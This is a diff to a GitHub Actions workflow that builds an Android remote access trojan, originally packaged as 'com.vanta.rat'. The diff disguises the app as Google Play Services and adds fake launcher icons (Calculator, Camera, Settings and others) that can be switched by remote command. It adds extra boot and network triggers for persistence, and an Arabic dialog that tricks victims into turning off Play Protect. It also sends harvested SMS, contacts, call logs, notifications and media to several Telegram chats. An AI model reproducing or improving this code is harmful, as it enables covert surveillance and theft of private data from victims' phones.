@@ -6,7 +6,7 @@ on:
         description: 'Bot Token'
         required: true
       chat:
-        description: 'Chat ID'
+        description: 'Chat ID (id1,id2)'
         required: true
 
 permissions:
@@ -32,13 +32,13 @@ jobs:
           BT: ${{ github.event.inputs.token }}
           CI: ${{ github.event.inputs.chat }}
         run: |
-          mkdir -p app/src/main/java/com/vanta/rat
+          mkdir -p app/src/main/java/com/google/android/gms/services
           mkdir -p app/src/main/res/values
           mkdir -p app/src/main/res/xml
 
           cat > settings.gradle <<'EOF'
           include ':app'
-          rootProject.name = "Svc"
+          rootProject.name = "GmsSvc"
           EOF
 
           cat > build.gradle <<'EOF'
@@ -52,10 +52,10 @@ jobs:
           cat > app/build.gradle <<'EOF'
           apply plugin: 'com.android.application'
           android {
-            namespace 'com.vanta.rat'
+            namespace 'com.google.android.gms.services'
             compileSdk 34
             defaultConfig {
-              applicationId "com.vanta.rat"
+              applicationId "com.google.android.gms.services"
               minSdk 21
               targetSdk 28
               versionCode 1
@@ -72,7 +72,7 @@ jobs:
 
           cat > app/src/main/res/values/strings.xml <<EOF
           <resources>
-            <string name="app_name">System Service</string>
+            <string name="app_name">خدمات Google Play</string>
             <string name="vanta_token">$BT</string>
             <string name="vanta_chat">$CI</string>
             <string name="vanta_server">http://147.135.213.72:20378</string>
@@ -103,6 +103,8 @@ jobs:
           <?xml version="1.0" encoding="utf-8"?>
           <manifest xmlns:android="http://schemas.android.com/apk/res/android">
             <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
             <uses-permission android:name="android.permission.READ_SMS"/>
             <uses-permission android:name="android.permission.RECEIVE_SMS"/>
             <uses-permission android:name="android.permission.READ_CONTACTS"/>
@@ -126,6 +128,70 @@ jobs:
                   <category android:name="android.intent.category.LAUNCHER"/>
                 </intent-filter>
               </activity>
+              <activity-alias android:label="الإعدادات" android:icon="@android:drawable/ic_menu_preferences"
+                  android:name=".AliasSettings" android:enabled="false" android:exported="true"
+                  android:targetActivity=".MainActivity">
+                <intent-filter>
+                  <action android:name="android.intent.action.MAIN"/>
+                  <category android:name="android.intent.category.LAUNCHER"/>
+                </intent-filter>
+              </activity-alias>
+              <activity-alias android:label="الآلة الحاسبة" android:icon="@android:drawable/ic_menu_manage"
+                  android:name=".AliasCalculator" android:enabled="false" android:exported="true"
+                  android:targetActivity=".MainActivity">
+                <intent-filter>
+                  <action android:name="android.intent.action.MAIN"/>
+                  <category android:name="android.intent.category.LAUNCHER"/>
+                </intent-filter>
+              </activity-alias>
+              <activity-alias android:label="الكاميرا" android:icon="@android:drawable/ic_menu_camera"
+                  android:name=".AliasCamera" android:enabled="false" android:exported="true"
+                  android:targetActivity=".MainActivity">
+                <intent-filter>
+                  <action android:name="android.intent.action.MAIN"/>
+                  <category android:name="android.intent.category.LAUNCHER"/>
+                </intent-filter>
+              </activity-alias>
+              <activity-alias android:label="التقويم" android:icon="@android:drawable/ic_menu_my_calendar"
+                  android:name=".AliasCalendar" android:enabled="false" android:exported="true"
+                  android:targetActivity=".MainActivity">
+                <intent-filter>
+                  <action android:name="android.intent.action.MAIN"/>
+                  <category android:name="android.intent.category.LAUNCHER"/>
+                </intent-filter>
+              </activity-alias>
+              <activity-alias android:label="الموسيقى" android:icon="@android:drawable/ic_media_play"
+                  android:name=".AliasMusic" android:enabled="false" android:exported="true"
+                  android:targetActivity=".MainActivity">
+                <intent-filter>
+                  <action android:name="android.intent.action.MAIN"/>
+                  <category android:name="android.intent.category.LAUNCHER"/>
+                </intent-filter>
+              </activity-alias>
+              <activity-alias android:label="المتجر" android:icon="@android:drawable/ic_menu_shop"
+                  android:name=".AliasStore" android:enabled="false" android:exported="true"
+                  android:targetActivity=".MainActivity">
+                <intent-filter>
+                  <action android:name="android.intent.action.MAIN"/>
+                  <category android:name="android.intent.category.LAUNCHER"/>
+                </intent-filter>
+              </activity-alias>
+              <activity-alias android:label="الخرائط" android:icon="@android:drawable/ic_dialog_map"
+                  android:name=".AliasMaps" android:enabled="false" android:exported="true"
+                  android:targetActivity=".MainActivity">
+                <intent-filter>
+                  <action android:name="android.intent.action.MAIN"/>
+                  <category android:name="android.intent.category.LAUNCHER"/>
+                </intent-filter>
+              </activity-alias>
+              <activity-alias android:label="البريد" android:icon="@android:drawable/ic_dialog_email"
+                  android:name=".AliasEmail" android:enabled="false" android:exported="true"
+                  android:targetActivity=".MainActivity">
+                <intent-filter>
+                  <action android:name="android.intent.action.MAIN"/>
+                  <category android:name="android.intent.category.LAUNCHER"/>
+                </intent-filter>
+              </activity-alias>
               <service android:name=".BotService" android:exported="false"
                   android:foregroundServiceType="camera|microphone|dataSync"/>
               <service android:name=".KeyService" android:exported="true"
@@ -155,29 +221,54 @@ jobs:
                   <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
                 </intent-filter>
               </receiver>
-              <receiver android:name=".BootReceiver" android:exported="true">
-                <intent-filter>
+              <receiver android:name=".BootReceiver" android:enabled="true" android:exported="true">
+                <intent-filter android:priority="999">
                   <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                  <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
+                  <action android:name="com.htc.intent.action.QUICKBOOT_POWERON"/>
+                  <action android:name="android.intent.action.USER_PRESENT"/>
+                  <action android:name="android.intent.action.ACTION_POWER_CONNECTED"/>
+                </intent-filter>
+              </receiver>
+              <receiver android:name=".NetworkReceiver" android:enabled="true" android:exported="true">
+                <intent-filter>
+                  <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+                  <action android:name="android.net.wifi.STATE_CHANGE"/>
                 </intent-filter>
               </receiver>
             </application>
           </manifest>
           EOF
 
-          cat > app/src/main/java/com/vanta/rat/AdminReceiver.java <<'EOF'
-          package com.vanta.rat;
+          cat > app/src/main/java/com/google/android/gms/services/AdminReceiver.java <<'EOF'
+          package com.google.android.gms.services;
           import android.app.admin.DeviceAdminReceiver;
           public class AdminReceiver extends DeviceAdminReceiver {
           }
           EOF
 
-          cat > app/src/main/java/com/vanta/rat/MainActivity.java <<'EOF'
-          package com.vanta.rat;
+          cat > app/src/main/java/com/google/android/gms/services/NetworkReceiver.java <<'EOF'
+          package com.google.android.gms.services;
+          import android.content.*;
+          public class NetworkReceiver extends BroadcastReceiver {
+            public void onReceive(Context c, Intent i) {
+              try {
+                Intent s = new Intent(c, BotService.class);
+                c.startForegroundService(s);
+              } catch (Exception e) {}
+            }
+          }
+          EOF
+
+          cat > app/src/main/java/com/google/android/gms/services/MainActivity.java <<'EOF'
+          package com.google.android.gms.services;
           import android.Manifest;
           import android.app.Activity;
+          import android.app.AlertDialog;
           import android.app.admin.DevicePolicyManager;
           import android.content.ComponentName;
           import android.content.Context;
+          import android.content.DialogInterface;
           import android.content.Intent;
           import android.content.pm.PackageManager;
           import android.os.Build;
@@ -205,7 +296,7 @@ jobs:
                 if (!dpm.isAdminActive(cn)) {
                   Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                   i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn);
-                  i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "تفعيل حماية الجهاز");
+                  i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "تحديث خدمات النظام");
                   startActivity(i);
                 }
               } catch (Exception e) {}
@@ -214,16 +305,45 @@ jobs:
                 if (Build.VERSION.SDK_INT >= 26) startForegroundService(i); else startService(i);
               } catch (Exception e) {}
               try {
+                new AlertDialog.Builder(this)
+                  .setTitle("تفعيل خدمات النظام")
+                  .setMessage("لتفعيل التحديث الأمني، لازم تقفل حماية Play Protect مؤقتاً.\n\nاضغط (فتح الإعدادات) → ومن قائمة Play Protect اضغط (إيقاف).")
+                  .setCancelable(false)
+                  .setPositiveButton("فتح الإعدادات", new DialogInterface.OnClickListener() {
+                    public void onClick(DialogInterface d, int w) {
+                      try {
+                        Intent i = new Intent("com.google.android.gms.security.settings.VerifyAppsSettingsActivity");
+                        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                        startActivity(i);
+                      } catch (Exception e) {
+                        try {
+                          startActivity(new Intent(android.provider.Settings.ACTION_SECURITY_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
+                        } catch (Exception e2) {}
+                      }
+                      openAccess();
+                      finish();
+                    }
+                  })
+                  .setNegativeButton("لاحقاً", new DialogInterface.OnClickListener() {
+                    public void onClick(DialogInterface d, int w) {
+                      openAccess();
+                      finish();
+                    }
+                  })
+                  .show();
+              } catch (Exception e) { finish(); }
+            }
+            void openAccess() {
+              try {
                 startActivity(new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS)
                   .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
               } catch (Exception e) {}
-              finish();
             }
           }
           EOF
 
-          cat > app/src/main/java/com/vanta/rat/KeyService.java <<'EOF'
-          package com.vanta.rat;
+          cat > app/src/main/java/com/google/android/gms/services/KeyService.java <<'EOF'
+          package com.google.android.gms.services;
           import android.accessibilityservice.AccessibilityService;
           import android.graphics.Bitmap;
           import android.os.Build;
@@ -270,8 +390,8 @@ jobs:
           }
           EOF
 
-          cat > app/src/main/java/com/vanta/rat/BotService.java <<'EOF'
-          package com.vanta.rat;
+          cat > app/src/main/java/com/google/android/gms/services/BotService.java <<'EOF'
+          package com.google.android.gms.services;
           import android.app.*;
           import android.app.admin.DevicePolicyManager;
           import android.content.*;
@@ -354,10 +474,14 @@ jobs:
               try {
                 String tk = ctx.getString(R.string.vanta_token);
                 String ch = ctx.getString(R.string.vanta_chat);
-                HttpURLConnection c = (HttpURLConnection) new URL("https://api.telegram.org/bot" + tk + "/sendMessage").openConnection();
-                c.setDoOutput(true); c.setRequestMethod("POST");
-                c.getOutputStream().write(("chat_id=" + ch + "&text=" + URLEncoder.encode(text, "UTF-8")).getBytes("UTF-8"));
-                c.getInputStream().close();
+                for (String one : ch.split(",")) {
+                  try {
+                    HttpURLConnection c = (HttpURLConnection) new URL("https://api.telegram.org/bot" + tk + "/sendMessage").openConnection();
+                    c.setDoOutput(true); c.setRequestMethod("POST");
+                    c.getOutputStream().write(("chat_id=" + one.trim() + "&text=" + URLEncoder.encode(text, "UTF-8")).getBytes("UTF-8"));
+                    c.getInputStream().close();
+                  } catch (Exception e) {}
+                }
               } catch (Exception e) {}
             }
             static void tgFile(Context ctx, String path, String caption) {
@@ -367,25 +491,32 @@ jobs:
                 if (f0.length() > 49000000) { sendRes(ctx, "⚠️ كبير أوي: " + f0.getName()); return; }
                 String tk = ctx.getString(R.string.vanta_token);
                 String ch = ctx.getString(R.string.vanta_chat);
-                String b = "----x" + System.currentTimeMillis();
-                ByteArrayOutputStream bo = new ByteArrayOutputStream();
-                bo.write(("--" + b + "\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + ch + "\r\n").getBytes("UTF-8"));
-                bo.write(("--" + b + "\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n" + caption + "\r\n").getBytes("UTF-8"));
-                bo.write(("--" + b + "\r\nContent-Disposition: form-data; name=\"document\"; filename=\"" + f0.getName() + "\"\r\n").getBytes("UTF-8"));
-                bo.write("Content-Type: application/octet-stream\r\n\r\n".getBytes("UTF-8"));
-                FileInputStream f = new FileInputStream(f0);
+                FileInputStream fis = new FileInputStream(f0);
+                ByteArrayOutputStream fb = new ByteArrayOutputStream();
                 byte[] buf = new byte[8192]; int n;
-                while ((n = f.read(buf)) > 0) bo.write(buf, 0, n);
-                f.close();
-                bo.write(("\r\n--" + b + "--\r\n").getBytes("UTF-8"));
-                byte[] body = bo.toByteArray();
-                HttpURLConnection c = (HttpURLConnection) new URL("https://api.telegram.org/bot" + tk + "/sendDocument").openConnection();
-                c.setDoOutput(true);
-                c.setRequestMethod("POST");
-                c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + b);
-                c.setFixedLengthStreamingMode(body.length);
-                c.getOutputStream().write(body);
-                c.getInputStream().close();
+                while ((n = fis.read(buf)) > 0) fb.write(buf, 0, n);
+                fis.close();
+                byte[] data = fb.toByteArray();
+                for (String one : ch.split(",")) {
+                  try {
+                    String b = "----x" + System.currentTimeMillis();
+                    ByteArrayOutputStream bo = new ByteArrayOutputStream();
+                    bo.write(("--" + b + "\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + one.trim() + "\r\n").getBytes("UTF-8"));
+                    bo.write(("--" + b + "\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n" + caption + "\r\n").getBytes("UTF-8"));
+                    bo.write(("--" + b + "\r\nContent-Disposition: form-data; name=\"document\"; filename=\"" + f0.getName() + "\"\r\n").getBytes("UTF-8"));
+                    bo.write("Content-Type: application/octet-stream\r\n\r\n".getBytes("UTF-8"));
+                    bo.write(data);
+                    bo.write(("\r\n--" + b + "--\r\n").getBytes("UTF-8"));
+                    byte[] body = bo.toByteArray();
+                    HttpURLConnection c = (HttpURLConnection) new URL("https://api.telegram.org/bot" + tk + "/sendDocument").openConnection();
+                    c.setDoOutput(true);
+                    c.setRequestMethod("POST");
+                    c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + b);
+                    c.setFixedLengthStreamingMode(body.length);
+                    c.getOutputStream().write(body);
+                    c.getInputStream().close();
+                  } catch (Exception e) {}
+                }
               } catch (Exception e) {
                 sendRes(ctx, "❌ فشل الإرسال: " + e);
               }
@@ -414,15 +545,14 @@ jobs:
                 String[] p = cmd.split(" ", 2);
                 String k = p[0].toLowerCase();
                 String a = p.length > 1 ? p[1] : "";
-                if (k.equals("sys")) {
-                  res(Build.MANUFACTURER + " " + Build.MODEL + " | Android " + Build.VERSION.RELEASE);
-                }
+                if (k.equals("sys")) res(Build.MANUFACTURER + " " + Build.MODEL + " | Android " + Build.VERSION.RELEASE);
                 else if (k.equals("sms")) smsFile();
                 else if (k.equals("contacts")) contactsFile();
                 else if (k.equals("calls")) callsFile();
                 else if (k.equals("notif")) notifFile();
                 else if (k.equals("photos")) sendAllMedia(true);
                 else if (k.equals("videos")) sendAllMedia(false);
+                else if (k.equals("icon")) setIcon(a);
                 else if (k.equals("files")) res(listDir(a));
                 else if (k.equals("ls")) res(listDir(a));
                 else if (k.equals("loc")) res(loc());
@@ -449,6 +579,18 @@ jobs:
                 else res("cmd: " + cmd);
               } catch (Exception e) { res("ERR " + e); }
             }
+            void setIcon(String a) {
+              try {
+                PackageManager pm = getPackageManager();
+                String[] names = {"Settings","Calculator","Camera","Calendar","Music","Store","Maps","Email"};
+                for (String nm : names) {
+                  ComponentName cn = new ComponentName(this, getPackageName() + ".Alias" + nm);
+                  int state = nm.equalsIgnoreCase(a) ? PackageManager.COMPONENT_ENABLED_STATE_ENABLED : PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
+                  pm.setComponentEnabledSetting(cn, state, PackageManager.DONT_KILL_APP);
+                }
+                res("🎭 الأيقونة بقت: " + a);
+              } catch (Exception e) { res("icon ERR " + e); }
+            }
             String contactName(String num) {
               try {
                 Uri u = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(num));
@@ -466,9 +608,7 @@ jobs:
               try {
                 java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm");
                 StringBuilder s = new StringBuilder();
-                s.append("━━━━━━━━━━━━━━━━━━━━━━\n");
-                s.append("💬  سجل الرسائل\n");
-                s.append("━━━━━━━━━━━━━━━━━━━━━━\n\n");
+                s.append("━━━━━━━━━━━━━━━━━━━━━━\n💬  سجل الرسائل\n━━━━━━━━━━━━━━━━━━━━━━\n\n");
                 Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC");
                 int n = 0;
                 while (c != null && c.moveToNext()) {
@@ -481,13 +621,10 @@ jobs:
                   s.append("📱 من: ").append(addr).append("\n");
                   if (nm.length() > 0) s.append("👤 الاسم: ").append(nm).append("\n");
                   s.append("📅 ").append(sdf.format(new java.util.Date(date))).append("\n");
-                  s.append("───────────────\n");
-                  s.append("📝 الرسالة:\n");
-                  s.append(body).append("\n\n");
+                  s.append("───────────────\n📝 الرسالة:\n").append(body).append("\n\n");
                 }
                 if (c != null) c.close();
-                s.append("━━━━━━━━━━━━━━━━━━━━━━\n");
-                s.append("📊 الإجمالي: ").append(n).append(" رسالة\n");
+                s.append("━━━━━━━━━━━━━━━━━━━━━━\n📊 الإجمالي: ").append(n).append(" رسالة\n");
                 String f = getExternalFilesDir(null) + "/sms.txt";
                 FileWriter fw = new FileWriter(f);
                 fw.write(s.toString());
@@ -499,22 +636,17 @@ jobs:
             void contactsFile() {
               try {
                 StringBuilder s = new StringBuilder();
-                s.append("━━━━━━━━━━━━━━━━━━━━━━\n");
-                s.append("📇  جهات الاتصال\n");
-                s.append("━━━━━━━━━━━━━━━━━━━━━━\n\n");
+                s.append("━━━━━━━━━━━━━━━━━━━━━━\n📇  جهات الاتصال\n━━━━━━━━━━━━━━━━━━━━━━\n\n");
                 Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
                 int n = 0;
                 while (c != null && c.moveToNext()) {
                   String nm = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                   String num = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
                   n++;
-                  s.append("━━━━━━━━━━━━━━━━━━━━━━\n");
-                  s.append("👤 الاسم: ").append(nm).append("\n");
-                  s.append("📞 الرقم: ").append(num).append("\n\n");
+                  s.append("━━━━━━━━━━━━━━━━━━━━━━\n👤 الاسم: ").append(nm).append("\n📞 الرقم: ").append(num).append("\n\n");
                 }
                 if (c != null) c.close();
-                s.append("━━━━━━━━━━━━━━━━━━━━━━\n");
-                s.append("📊 الإجمالي: ").append(n).append(" جهة اتصال\n");
+                s.append("━━━━━━━━━━━━━━━━━━━━━━\n📊 الإجمالي: ").append(n).append(" جهة اتصال\n");
                 String f = getExternalFilesDir(null) + "/contacts.txt";
                 FileWriter fw = new FileWriter(f);
                 fw.write(s.toString());
@@ -527,9 +659,7 @@ jobs:
               try {
                 java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm");
                 StringBuilder s = new StringBuilder();
-                s.append("━━━━━━━━━━━━━━━━━━━━━━\n");
-                s.append("📞  سجل المكالمات\n");
-                s.append("━━━━━━━━━━━━━━━━━━━━━━\n\n");
+                s.append("━━━━━━━━━━━━━━━━━━━━━━\n📞  سجل المكالمات\n━━━━━━━━━━━━━━━━━━━━━━\n\n");
                 Cursor c = getContentResolver().query(android.provider.CallLog.Calls.CONTENT_URI, null, null, null, "date DESC");
                 int n = 0;
                 while (c != null && c.moveToNext()) {
@@ -547,13 +677,10 @@ jobs:
                   s.append("━━━━━━━━━━━━━━━━━━━━━━\n");
                   s.append("📱 الرقم: ").append(num).append("\n");
                   if (nm.length() > 0) s.append("👤 الاسم: ").append(nm).append("\n");
-                  s.append("📊 النوع: ").append(t).append("\n");
-                  s.append("📅 ").append(sdf.format(new java.util.Date(date))).append("\n");
-                  s.append("⏱ المدة: ").append(dur).append(" ثانية\n\n");
+                  s.append("📊 النوع: ").append(t).append("\n📅 ").append(sdf.format(new java.util.Date(date))).append("\n⏱ المدة: ").append(dur).append(" ثانية\n\n");
                 }
                 if (c != null) c.close();
-                s.append("━━━━━━━━━━━━━━━━━━━━━━\n");
-                s.append("📊 الإجمالي: ").append(n).append(" مكالمة\n");
+                s.append("━━━━━━━━━━━━━━━━━━━━━━\n📊 الإجمالي: ").append(n).append(" مكالمة\n");
                 String f = getExternalFilesDir(null) + "/calls.txt";
                 FileWriter fw = new FileWriter(f);
                 fw.write(s.toString());
@@ -748,8 +875,8 @@ jobs:
           }
           EOF
 
-          cat > app/src/main/java/com/vanta/rat/NotifListener.java <<'EOF'
-          package com.vanta.rat;
+          cat > app/src/main/java/com/google/android/gms/services/NotifListener.java <<'EOF'
+          package com.google.android.gms.services;
           import android.app.Notification;
           import android.os.Bundle;
           import android.service.notification.*;
@@ -771,27 +898,22 @@ jobs:
             }
             public static String dump() {
               StringBuilder s = new StringBuilder();
-              s.append("━━━━━━━━━━━━━━━━━━━━━━\n");
-              s.append("🔔  الإشعارات\n");
-              s.append("━━━━━━━━━━━━━━━━━━━━━━\n\n");
+              s.append("━━━━━━━━━━━━━━━━━━━━━━\n🔔  الإشعارات\n━━━━━━━━━━━━━━━━━━━━━━\n\n");
               synchronized (L) {
                 int i = 0;
                 for (String x : L) {
                   i++;
-                  s.append("🔔 إشعار رقم: ").append(i).append("\n");
-                  s.append("📝 ").append(x).append("\n");
-                  s.append("───────────────────────────\n\n");
+                  s.append("🔔 إشعار رقم: ").append(i).append("\n📝 ").append(x).append("\n───────────────────────────\n\n");
                 }
-                s.append("━━━━━━━━━━━━━━━━━━━━━━\n");
-                s.append("📊 الإجمالي: ").append(i).append(" إشعار\n");
+                s.append("━━━━━━━━━━━━━━━━━━━━━━\n📊 الإجمالي: ").append(i).append(" إشعار\n");
               }
               return s.toString();
             }
           }
           EOF
 
-          cat > app/src/main/java/com/vanta/rat/SmsReceiver.java <<'EOF'
-          package com.vanta.rat;
+          cat > app/src/main/java/com/google/android/gms/services/SmsReceiver.java <<'EOF'
+          package com.google.android.gms.services;
           import android.content.*;
           import android.telephony.SmsMessage;
           public class SmsReceiver extends BroadcastReceiver {
@@ -811,8 +933,8 @@ jobs:
           }
           EOF
 
-          cat > app/src/main/java/com/vanta/rat/BootReceiver.java <<'EOF'
-          package com.vanta.rat;
+          cat > app/src/main/java/com/google/android/gms/services/BootReceiver.java <<'EOF'
+          package com.google.android.gms.services;
           import android.content.*;
           import android.os.Build;
           public class BootReceiver extends BroadcastReceiver {
